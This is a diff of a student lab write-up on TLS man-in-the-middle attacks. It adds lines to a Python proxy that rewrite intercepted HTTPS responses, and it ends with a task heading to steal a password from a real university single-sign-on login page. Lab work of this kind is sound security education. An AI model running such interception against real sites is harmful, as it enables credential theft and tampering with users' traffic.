@@ -782,9 +782,11 @@ This simulates the existence of a proxy because the traffic for `www.pinto2022.c
 
           # Get response from server, and forward it to browser
           response = ssock_for_server.recv(2048)
+          response = response.replace(b"Bank32", b"FEUP22")
           while response:
               ssock_for_browser.sendall(response) # Forward to browser
               response = ssock_for_server.recv(2048)
+              response = response.replace(b"Bank32", b"FEUP22")
               
       ssock_for_browser.shutdown(socket.SHUT_RDWR)
       ssock_for_browser.close()
@@ -871,6 +873,8 @@ This simulates the existence of a proxy because the traffic for `www.pinto2022.c
           print("TLS connection fails")
           continue
   ```
+
+  - In the `proxy.py` code the `Bank32` string on every response gets replaced by `FEUP22`. This way we show our MITM agent is working.
 
 - **Launch the MITM attack on a real HTTPS website that has a login. Steal the password.**
   - **Target:** https://wayf.up.pt/idp/profile/SAML2/Redirect/SSO?execution=e3s2
